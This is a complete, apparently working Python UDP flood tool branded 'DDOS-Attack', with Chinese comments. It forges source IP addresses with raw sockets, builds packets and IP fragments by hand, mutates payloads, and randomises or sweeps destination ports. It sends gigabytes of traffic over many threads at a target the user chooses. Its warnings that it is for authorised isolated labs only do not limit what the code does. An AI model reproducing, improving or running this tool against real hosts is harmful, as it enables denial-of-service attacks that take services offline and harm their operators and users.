#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import re
import time
import signal
import socket
import ipaddress
import random
import struct
import argparse
import threading
import subprocess
import errno as errno_mod


# ==================== 全局常量 ====================
IP_HEADER_LEN = 20
UDP_HEADER_LEN = 8
DEFAULT_MTU = 1500
MAX_PAYLOAD_DF = DEFAULT_MTU - IP_HEADER_LEN - UDP_HEADER_LEN  # 1472


# ==================== 跨平台清屏 ====================
def clear_screen():
    # 清屏，兼容 Windows (cls) 和 Unix-like (clear)
    os.system('cls' if os.name == 'nt' else 'clear')


# ==================== 日志（控制台 + 文件） ====================
class Logger:
    # 支持控制台 + 文件双写，线程安全，可 flush
    def __init__(self, log_file=None, quiet=False):
        self.lock = threading.Lock()
        self.fp = None
        self.quiet = quiet
        if log_file:
            try:
                self.fp = open(log_file, 'a', encoding='utf-8')
                self.fp.write(f"\n--- 会话开始于 {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                self.fp.flush()
            except OSError as e:
                print(f"[!] 无法打开日志文件: {e}", file=sys.stderr)
                self.fp = None

    def log(self, msg):
        # 只写文件，不写控制台（--quiet 时）
        with self.lock:
            if not self.quiet:
                print(msg)
            if self.fp:
                self.fp.write(msg + '\n')
                self.fp.flush()

    def err(self, msg):
        # 错误总是写 stderr，同时写文件
        with self.lock:
            if not self.quiet:
                print(msg, file=sys.stderr)
            if self.fp:
                self.fp.write(msg + '\n')
                self.fp.flush()

    def close(self):
        with self.lock:
            if self.fp:
                self.fp.close()
                self.fp = None


# ==================== 启动画面 ====================
def show_banner(logger, no_banner=False):
    if no_banner:
        return
    clear_screen()
    logger.log("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    logger.log("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
    logger.log("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
    logger.log("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu")
    logger.log("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu")
    logger.log("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
    logger.log("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
    logger.log("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
    logger.log("======================== 严重警告 =========================")
    logger.log("你正在跨越法律和道德的边界。请立即退出，或等待 3 秒。")
    logger.log("仅限授权的隔离实验环境使用。")
    logger.log("==========================================================")
    time.sleep(1)
    logger.log("3"); time.sleep(1)
    logger.log("2"); time.sleep(1)
    logger.log("1"); time.sleep(1)
    logger.log("Starting...")
    time.sleep(1)

    clear_screen()
    if os.name != 'nt':
        ret = os.system("figlet DDOS-Attack 2>/dev/null")
    else:
        ret = os.system("figlet DDOS-Attack 2>nul")
    if ret != 0:
        logger.log(r" ____  ____   ___  ____          _   _   _             _     ")
        logger.log(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ")
        logger.log(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ")
        logger.log(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ")
        logger.log(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")
    logger.log("==================================================================")
    logger.log("Author  : Su-StackTrace")
    logger.log("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
    logger.log("==================================================================")
    logger.log("")


# ==================== 校验和计算 ====================
def ip_checksum(data):
    # RFC 1071 16-bit 反码校验和
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def udp_checksum(src_ip, dst_ip, udp_hdr, payload):
    # UDP 校验和需要伪头
    pseudo = (socket.inet_aton(src_ip) +
              socket.inet_aton(dst_ip) +
              b'\x00\x11' +
              struct.pack('!H', len(udp_hdr) + len(payload)))
    result = ip_checksum(pseudo + udp_hdr + payload)
    # 结果为 0 时改 0xFFFF，避免被防火墙跳过
    return result if result != 0 else 0xFFFF


# ==================== 本地网络探测 ====================
def get_local_ip():
    # 通过 UDP connect 探测出口 IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def get_local_net(local_ip, override=None):
    # 优先用户指定；否则尝试系统命令；最后回退 /24
    if override:
        try:
            return ipaddress.ip_network(override, strict=False), "user-specified"
        except ValueError:
            pass
    if not local_ip:
        return None, "no-local-ip"
    # Linux: ip -o -4 addr show
    try:
        r = subprocess.run(['ip', '-o', '-4', 'addr', 'show'],
                           capture_output=True, text=True, timeout=2)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if local_ip in line:
                    m = re.search(r'inet\s+([\d.]+/\d+)', line)
                    if m:
                        return ipaddress.ip_network(m.group(1), strict=False), "ip-command"
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass
    # macOS/BSD: ifconfig
    try:
        r = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=2)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if 'inet ' in line and local_ip in line:
                    m = re.search(r'inet\s+([\d.]+)\s+netmask\s+(0x[0-9a-fA-F]+)', line)
                    if m:
                        mask_int = int(m.group(2), 16)
                        prefix = bin(mask_int).count('1')
                        return ipaddress.ip_network(f"{m.group(1)}/{prefix}", strict=False), "ifconfig"
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass
    # 兜底 /24
    return ipaddress.ip_network(f"{local_ip}/24", strict=False), "fallback-/24"


# ==================== 伪造 IP 校验 ====================
def validate_spoof_ip(spoof_ip, target_ip, local_net):
    # 返回 (is_valid, message)
    try:
        s = ipaddress.ip_address(spoof_ip)
        t = ipaddress.ip_address(target_ip)
    except ValueError:
        return False, "无效的 IP 地址"
    if not isinstance(s, ipaddress.IPv4Address):
        return False, "仅支持 IPv4 伪造"
    if s.is_loopback:
        return False, f"拒绝伪造 {spoof_ip}：回环地址"
    if s.is_multicast:
        return False, f"拒绝伪造 {spoof_ip}：组播地址"
    if s.is_unspecified:
        return False, f"拒绝伪造 {spoof_ip}：0.0.0.0 无意义"
    if s.is_reserved:
        return False, f"拒绝伪造 {spoof_ip}：保留地址"
    if s.is_link_local:
        return False, f"拒绝伪造 {spoof_ip}：链路本地地址"
    if s == t:
        return False, "拒绝伪造：伪造 IP 不能等于目标 IP"
    if local_net and s not in local_net:
        return True, (f"警告：{spoof_ip} 不在本机子网 {local_net} 内，"
                      f"跨路由伪造会被 uRPF 过滤，实际无效")
    return True, f"OK：{spoof_ip} 在本机子网 {local_net} 内"


# ==================== 包构造 ====================
def build_udp_header_for(src_ip, dst_ip, src_port, dst_port, payload):
    # 显式带 src/dst 的 UDP 段构造
    udp_len = UDP_HEADER_LEN + len(payload)
    hdr = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
    chk = udp_checksum(src_ip, dst_ip, hdr, payload)
    return struct.pack('!HHHH', src_port, dst_port, udp_len, chk) + payload


def build_ip_udp_df(spoof_ip, target_ip, src_port, dst_port, payload, ttl, ip_id):
    # DF 模式：单个不分片包
    total_len = IP_HEADER_LEN + UDP_HEADER_LEN + len(payload)
    udp_segment = build_udp_header_for(spoof_ip, target_ip, src_port, dst_port, payload)
    ip_frag_off = 0x4000  # DF=1
    ip_saddr = socket.inet_aton(spoof_ip)
    ip_daddr = socket.inet_aton(target_ip)
    hdr = struct.pack('!BBHHHBBH4s4s',
                      0x45, 0, total_len,
                      ip_id, ip_frag_off,
                      ttl, socket.IPPROTO_UDP, 0,
                      ip_saddr, ip_daddr)
    chk = ip_checksum(hdr)
    hdr = struct.pack('!BBHHHBBH4s4s',
                      0x45, 0, total_len,
                      ip_id, ip_frag_off,
                      ttl, socket.IPPROTO_UDP, chk,
                      ip_saddr, ip_daddr)
    return hdr + udp_segment


def build_ip_udp_fragmented(spoof_ip, target_ip, src_port, dst_port, payload, ttl, ip_id, mtu):
    # 真 IP 分片：返回 list，每个元素是一个完整 IP 分片
    udp_segment = build_udp_header_for(spoof_ip, target_ip, src_port, dst_port, payload)
    total_data = len(udp_segment)
    max_data = ((mtu - IP_HEADER_LEN) // 8) * 8
    if max_data < 8:
        raise ValueError(f"MTU {mtu} 太小，无法分片")
    ip_saddr = socket.inet_aton(spoof_ip)
    ip_daddr = socket.inet_aton(target_ip)
    fragments = []
    offset = 0
    while offset < total_data:
        chunk = udp_segment[offset:offset + max_data]
        is_last = (offset + len(chunk)) >= total_data
        mf = 0 if is_last else 1
        frag_off = offset // 8
        flag_off = (mf << 13) | frag_off
        total_len = IP_HEADER_LEN + len(chunk)
        hdr = struct.pack('!BBHHHBBH4s4s',
                          0x45, 0, total_len,
                          ip_id, flag_off,
                          ttl, socket.IPPROTO_UDP, 0,
                          ip_saddr, ip_daddr)
        chk = ip_checksum(hdr)
        hdr = struct.pack('!BBHHHBBH4s4s',
                          0x45, 0, total_len,
                          ip_id, flag_off,
                          ttl, socket.IPPROTO_UDP, chk,
                          ip_saddr, ip_daddr)
        fragments.append(hdr + chunk)
        offset += len(chunk)
    return fragments


# ==================== 变异 payload 池 ====================
def build_variant_pool(base_size, pool_size, vary=True):
    # 池内每项长度在 base_size ± 10% 内随机，内容随机
    rnd = random.Random()
    delta = max(1, base_size // 10) if vary else 0
    pool = []
    for _ in range(pool_size):
        length = base_size - delta + (rnd.randint(0, delta * 2) if delta else 0)
        length = max(28, min(length, 65000))
        pool.append(bytearray(rnd.getrandbits(8) for _ in range(length)))
    return pool


def mutate_payload(payload, counter, rnd):
    # 尾 8 字节写计数器 + 前部 16 字节 XOR 翻转
    n = len(payload)
    if n >= 8:
        c = counter
        for b in range(8):
            payload[n - 1 - b] = c & 0xFF
            c >>= 8
    if n >= 24:
        for b in range(16):
            idx = 4 + b
            payload[idx] ^= rnd.randint(0, 255)


# ==================== 精确速率控制 ====================
class PreciseRateLimiter:
    # 用 perf_counter_ns 累积时间轴，避免 sleep 抖动累积
    def __init__(self, interval_sec):
        self.interval_ns = int(interval_sec * 1e9) if interval_sec > 0 else 0
        self.next_tick_ns = time.perf_counter_ns()

    def wait(self):
        if self.interval_ns <= 0:
            return
        self.next_tick_ns += self.interval_ns
        now_ns = time.perf_counter_ns()
        sleep_ns = self.next_tick_ns - now_ns
        if sleep_ns <= 0:
            self.next_tick_ns = now_ns
            return
        if sleep_ns > 1_500_000:
            time.sleep((sleep_ns - 500_000) / 1e9)
        while time.perf_counter_ns() < self.next_tick_ns:
            pass


# ==================== 带宽保护 ====================
class BandwidthGuard:
    # 同时限制包速率和字节速率
    def __init__(self, max_pps, max_mbps):
        self.max_pps = max_pps
        self.max_bytes_per_sec = max_mbps * 1024 * 1024 / 8 if max_mbps > 0 else 0
        self.window_start = time.perf_counter()
        self.window_packets = 0
        self.window_bytes = 0
        self.lock = threading.Lock()

    def allow(self, pkt_bytes):
        if self.max_pps <= 0 and self.max_bytes_per_sec <= 0:
            return True
        now = time.perf_counter()
        with self.lock:
            elapsed = now - self.window_start
            if elapsed >= 1.0:
                self.window_start = now
                self.window_packets = 0
                self.window_bytes = 0
            if self.max_pps > 0 and self.window_packets >= self.max_pps:
                return False
            if self.max_bytes_per_sec > 0 and self.window_bytes + pkt_bytes > self.max_bytes_per_sec:
                return False
            self.window_packets += 1
            self.window_bytes += pkt_bytes
            return True


# ==================== 统计 ====================
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.bytes_sent = 0
        self.dropped = 0
        self.icmp_unreach = 0
        self.err_counters = {}

    def add_sent(self, n, b):
        with self.lock:
            self.sent += n
            self.bytes_sent += b

    def add_dropped(self, n=1):
        with self.lock:
            self.dropped += n

    def add_icmp(self):
        with self.lock:
            self.icmp_unreach += 1

    def add_error(self, category):
        with self.lock:
            self.err_counters[category] = self.err_counters.get(category, 0) + 1

    def snapshot(self):
        with self.lock:
            return {
                'sent': self.sent,
                'bytes': self.bytes_sent,
                'dropped': self.dropped,
                'icmp_unreach': self.icmp_unreach,
                'errors': dict(self.err_counters),
            }


# ==================== 异常分类 ====================
def classify_send_error(e):
    if isinstance(e, BlockingIOError):
        return "EAGAIN"
    if isinstance(e, BufferError):
        return "ENOBUFS"
    if isinstance(e, ConnectionRefusedError):
        return "ICMP_PORT_UNREACH"
    if isinstance(e, PermissionError):
        return "EACCES"
    if isinstance(e, OSError):
        code = e.errno
        if code == errno_mod.ENOBUFS:
            return "ENOBUFS"
        if code == errno_mod.EMSGSIZE:
            return "EMSGSIZE"
        if code == errno_mod.EHOSTUNREACH:
            return "EHOSTUNREACH"
        if code == errno_mod.ENETUNREACH:
            return "ENETUNREACH"
        if code == errno_mod.EACCES:
            return "EACCES"
        if code == errno_mod.EPERM:
            return "EPERM"
        return f"E{code}"
    return "UNKNOWN"


# ==================== UDP 探测 ====================
def udp_probe(target_ip, target_port, timeout=0.5):
    # 发送空 UDP 包，尝试捕获 ICMP 不可达
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.connect((target_ip, target_port))
        s.send(b'\x00')
        try:
            s.recv(1024)
            s.close()
            return "open"
        except ConnectionRefusedError:
            s.close()
            return "closed"
        except socket.timeout:
            s.close()
            return "unknown"
    except OSError:
        return "unknown"


# ==================== ICMP 监听线程 ====================
def icmp_listener(stats, stop_event, logger):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        s.settimeout(0.5)
    except PermissionError:
        logger.log("[>] ICMP 监听需要 root，已跳过")
        return
    except OSError:
        return
    logger.log("[>] ICMP 监听已启动")
    while not stop_event.is_set():
        try:
            data, addr = s.recvfrom(2048)
        except socket.timeout:
            continue
        except OSError:
            break
        if len(data) < 20:
            continue
        try:
            ihl = (data[0] & 0x0F) * 4
            icmp_type = data[ihl]
            if icmp_type == 3:
                stats.add_icmp()
        except IndexError:
            pass
    s.close()


# ==================== 发包 worker ====================
def sender_worker(thread_id, target_ip, target_port, spoof_ip, config, stats,
                  stop_event, logger):
    rnd = random.Random(thread_id * 0x9E3779B1)
    pool = build_variant_pool(config['packet_size'], config['pool_size'], config['vary'])
    ip_id_base = rnd.randint(1, 0xFFFF)
    rate_limiter = PreciseRateLimiter(config['rate_limit'])
    guard = config['guard']
    src_port_fixed = config['src_port']
    ttl = config['ttl']
    use_spoof = spoof_ip is not None
    df_mode = not config['fragment']
    local_target_port = target_port

    sock = None
    try:
        if use_spoof:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if src_port_fixed is not None:
                try:
                    sock.bind(('', src_port_fixed + thread_id))
                except OSError as e:
                    logger.err(f"[!] T{thread_id}: 绑定源端口失败: {e}")
    except PermissionError:
        logger.err(f"[!] T{thread_id}: 权限不足，需要 root")
        return
    except OSError as e:
        logger.err(f"[!] T{thread_id}: socket 创建失败: {e}")
        return

    counter = 0
    consecutive_fail = 0
    while not stop_event.is_set() and stats.snapshot()['sent'] < config['max_packets']:
        for _ in range(config['burst_size']):
            if stop_event.is_set():
                break
            if stats.snapshot()['sent'] >= config['max_packets']:
                break

            payload = pool[counter % len(pool)]
            mutate_payload(payload, counter, rnd)
            counter += 1

            if config['random_port']:
                dst_port = rnd.randint(1, 65535)
            elif config['port_sweep']:
                dst_port = ((local_target_port - 1 + counter) % 65535) + 1
            else:
                dst_port = target_port

            if src_port_fixed is not None:
                src_port = src_port_fixed + thread_id
            else:
                src_port = rnd.randint(1024, 65535)

            pkt_size_est = config['packet_size']
            if not guard.allow(pkt_size_est):
                time.sleep(0.001)
                continue

            try:
                if use_spoof:
                    ip_id = (ip_id_base + counter) & 0xFFFF
                    if ip_id == 0:
                        ip_id = 1
                    if df_mode:
                        pkt = build_ip_udp_df(spoof_ip, target_ip, src_port,
                                              dst_port, bytes(payload), ttl, ip_id)
                        sock.sendto(pkt, (target_ip, 0))
                        stats.add_sent(1, len(pkt))
                    else:
                        frags = build_ip_udp_fragmented(spoof_ip, target_ip, src_port,
                                                         dst_port, bytes(payload),
                                                         ttl, ip_id, config['mtu'])
                        for f in frags:
                            sock.sendto(f, (target_ip, 0))
                        stats.add_sent(1, sum(len(f) for f in frags))
                else:
                    sock.sendto(payload, (target_ip, dst_port))
                    stats.add_sent(1, len(payload))
                consecutive_fail = 0
            except OSError as e:
                category = classify_send_error(e)
                stats.add_dropped(1)
                stats.add_error(category)
                consecutive_fail += 1
                if consecutive_fail >= 3:
                    backoff_ms = min(1000, 10 << min(consecutive_fail - 3, 6))
                    time.sleep(backoff_ms / 1000.0)

        rate_limiter.wait()


# ==================== 参数解析 ====================
def parse_args():
    p = argparse.ArgumentParser(
        description="带源 IP 伪造的 UDP 洪水工具（授权隔离环境）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例：\n"
               "  python3 DDOS-Attack_03_c.py -t 10.0.0.1 -p 53 -g 1 --spoof 10.0.0.99\n"
               "  python3 DDOS-Attack_03_c.py -t 10.0.0.1 -p 53 -g 1 --spoof 10.0.0.99 --fragment\n"
    )
    p.add_argument('-t', '--target', help='目标 IP')
    p.add_argument('-p', '--port', type=int, help='目标端口')
    p.add_argument('-g', '--gb', type=float, help='总流量 (GB)')
    p.add_argument('--spoof', help='伪造源 IP（需 root）')
    p.add_argument('--size', type=int, default=MAX_PAYLOAD_DF, help='包大小（字节）')
    p.add_argument('--mtu', type=int, default=DEFAULT_MTU, help='分片 MTU')
    p.add_argument('--ttl', type=int, default=64, help='TTL')
    p.add_argument('-P', '--threads', type=int, default=0, help='线程数（0=自动）')
    p.add_argument('-b', '--burst', type=int, default=50, help='每突发包数')
    p.add_argument('-r', '--rate', type=float, default=0.0, help='每突发间隔（秒）')
    p.add_argument('--src-port', type=int, default=None, help='源端口基数')
    p.add_argument('--random-port', action='store_true', help='随机目标端口')
    p.add_argument('--port-sweep', action='store_true', help='目标端口递增')
    p.add_argument('--fragment', action='store_true', help='启用真 IP 分片')
    p.add_argument('--no-vary', action='store_true', help='关闭 payload 变异')
    p.add_argument('--pool-size', type=int, default=256, help='payload 池大小')
    p.add_argument('--max-pps', type=int, default=0, help='包速率上限（0=不限）')
    p.add_argument('--max-mbps', type=int, default=0, help='带宽上限 Mbps（0=不限）')
    p.add_argument('--local-subnet', help='本机子网（覆盖自动探测）')
    p.add_argument('--log', help='日志文件路径')
    p.add_argument('--no-banner', action='store_true', help='跳过启动横幅')
    p.add_argument('--quiet', action='store_true', help='只写文件不写控制台')
    p.add_argument('--no-check', action='store_true', help='跳过连通性探测')
    p.add_argument('--no-icmp', action='store_true', help='关闭 ICMP 监听')
    p.add_argument('--no-interactive', action='store_true', help='跳过所有交互')
    return p.parse_args()


# ==================== 主 ====================
def main():
    args = parse_args()
    logger = Logger(args.log, args.quiet)
    show_banner(logger, args.no_banner)

    # 参数补齐（交互）
    if not args.target:
        args.target = input("[?] 目标 IP: ").strip()
    try:
        ipaddress.ip_address(args.target)
    except ValueError:
        logger.err("[!] 无效的目标 IP")
        return 1
    if args.port is None:
        try:
            args.port = int(input("[?] 目标端口: ").strip())
        except ValueError:
            logger.err("[!] 无效端口")
            return 1
    if not (1 <= args.port <= 65535):
        logger.err("[!] 端口必须在 1-65535")
        return 1
    if args.gb is None:
        try:
            args.gb = float(input("[?] 总流量 (GB): ").strip())
        except ValueError:
            logger.err("[!] 无效流量")
            return 1
    if args.gb <= 0:
        logger.err("[!] 流量必须 > 0")
        return 1

    # 伪造 IP 校验
    local_ip = get_local_ip()
    local_net, net_source = get_local_net(local_ip, args.local_subnet)
    if local_ip:
        logger.log(f"[>] 本机出口 IP: {local_ip}")
    if local_net:
        logger.log(f"[>] 本机子网: {local_net} (来源: {net_source})")

    if args.spoof:
        valid, msg = validate_spoof_ip(args.spoof, args.target, local_net)
        if not valid:
            logger.err(f"[!] {msg}")
            return 1
        logger.log(f"[>] {msg}")
        if args.fragment:
            logger.log(f"[>] 真 IP 分片已启用（MTU={args.mtu}）")
        else:
            logger.log(f"[>] DF 模式（不分片）")

    # 包大小
    if args.fragment:
        if args.size > args.mtu - IP_HEADER_LEN:
            logger.log(f"[!] payload > MTU-{IP_HEADER_LEN}，截断到 {args.mtu - IP_HEADER_LEN}")
            args.size = args.mtu - IP_HEADER_LEN
    else:
        if args.size > MAX_PAYLOAD_DF:
            logger.log(f"[!] DF 模式 payload 最大 {MAX_PAYLOAD_DF}，截断")
            args.size = MAX_PAYLOAD_DF
    if args.size < 28:
        args.size = 28

    total_bytes = int(args.gb * 1024 * 1024 * 1024)
    max_packets = total_bytes // args.size
    if max_packets <= 0:
        logger.err("[!] 流量太小")
        return 1

    # 线程数
    threads = args.threads
    if threads <= 0:
        threads = max(2, (os.cpu_count() or 4) // 2)

    # 汇总
    logger.log(f"\n[>] 目标: {args.target}:{args.port}")
    logger.log(f"[>] 总流量: {args.gb:.2f} GB ({max_packets} 包)")
    logger.log(f"[>] 包大小: {args.size} 字节")
    logger.log(f"[>] 线程数: {threads}")
    if args.spoof:
        logger.log(f"[>] 伪造源 IP: {args.spoof}")
    else:
        logger.log(f"[>] 普通 UDP 模式")
    if args.random_port:
        logger.log("[>] 随机目标端口: 启用")
    if args.port_sweep:
        logger.log("[>] 目标端口递增: 启用")
    if args.max_pps > 0:
        logger.log(f"[>] 包速率上限: {args.max_pps} pps")
    if args.max_mbps > 0:
        logger.log(f"[>] 带宽上限: {args.max_mbps} Mbps")

    # UDP 探测
    if not args.no_check and not args.no_interactive:
        logger.log("[>] UDP 探测目标端口...")
        result = udp_probe(args.target, args.port, timeout=0.5)
        logger.log(f"[>] 探测结果: {result}")
        if result == "closed":
            logger.log("[!] 端口显示为关闭（ICMP 不可达），但可能仍有过滤")
        elif result == "unknown":
            logger.log("[>] 无响应，无法判断（UDP 正常行为）")

    # 确认
    if not args.no_interactive:
        print("\n[!] 最后警告：确认这是你拥有授权的隔离设备。")
        try:
            confirm = input("[?] 确认 (yes/no): ").strip().lower()
        except EOFError:
            confirm = "no"
        if confirm != "yes":
            logger.log("[>] 用户取消")
            logger.close()
            return 0

    # 构造运行配置
    config = {
        'packet_size': args.size,
        'mtu': args.mtu,
        'ttl': args.ttl,
        'burst_size': args.burst,
        'rate_limit': args.rate,
        'src_port': args.src_port,
        'random_port': args.random_port,
        'port_sweep': args.port_sweep,
        'fragment': args.fragment,
        'vary': not args.no_vary,
        'pool_size': args.pool_size,
        'max_packets': max_packets,
        'guard': BandwidthGuard(args.max_pps, args.max_mbps),
    }

    stats = Stats()
    stop_event = threading.Event()

    def on_sigint(sig, frame):
        stop_event.set()
        logger.log("\n[!] 收到 Ctrl+C，正在停止...")
    signal.signal(signal.SIGINT, on_sigint)

    icmp_thread = None
    if not args.no_icmp and args.spoof:
        icmp_thread = threading.Thread(target=icmp_listener,
                                       args=(stats, stop_event, logger),
                                       daemon=True)
        icmp_thread.start()

    logger.log(f"\n[>] 启动 {threads} 个发包线程...")
    workers = []
    for i in range(threads):
        t = threading.Thread(target=sender_worker,
                             args=(i, args.target, args.port, args.spoof,
                                   config, stats, stop_event, logger),
                             daemon=True)
        t.start()
        workers.append(t)

    start_time = time.perf_counter()
    last_report = start_time
    last_sent = 0
    try:
        while not stop_event.is_set():
            time.sleep(0.5)
            now = time.perf_counter()
            elapsed = now - start_time
            snap = stats.snapshot()
            if snap['sent'] >= max_packets:
                break
            if now - last_report >= 1.0:
                delta_sent = snap['sent'] - last_sent
                inst_rate = delta_sent / (now - last_report)
                rate = snap['sent'] / elapsed if elapsed > 0 else 0
                gb = snap['bytes'] / (1024 ** 3)
                logger.log(f"[>] {snap['sent']}/{max_packets} | {gb:.4f} GB | "
                           f"{rate:.0f} pps | inst={inst_rate:.0f} | "
                           f"drop={snap['dropped']} | icmp={snap['icmp_unreach']}")
                last_report = now
                last_sent = snap['sent']
    except KeyboardInterrupt:
        pass

    stop_event.set()
    for t in workers:
        t.join(timeout=2)

    snap = stats.snapshot()
    elapsed = time.perf_counter() - start_time
    gb = snap['bytes'] / (1024 ** 3)
    rate = snap['sent'] / elapsed if elapsed > 0 else 0
    logger.log(f"\n[>] 完成：")
    logger.log(f"    发送包数: {snap['sent']}")
    logger.log(f"    丢弃包数: {snap['dropped']}")
    logger.log(f"    ICMP 不可达: {snap['icmp_unreach']}")
    logger.log(f"    总数据量: {gb:.4f} GB")
    logger.log(f"    耗时: {elapsed:.2f} 秒")
    logger.log(f"    平均速率: {rate:.1f} pps")
    if snap['errors']:
        logger.log(f"    错误分布:")
        for k, v in sorted(snap['errors'].items()):
            logger.log(f"      {k}: {v}")

    logger.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
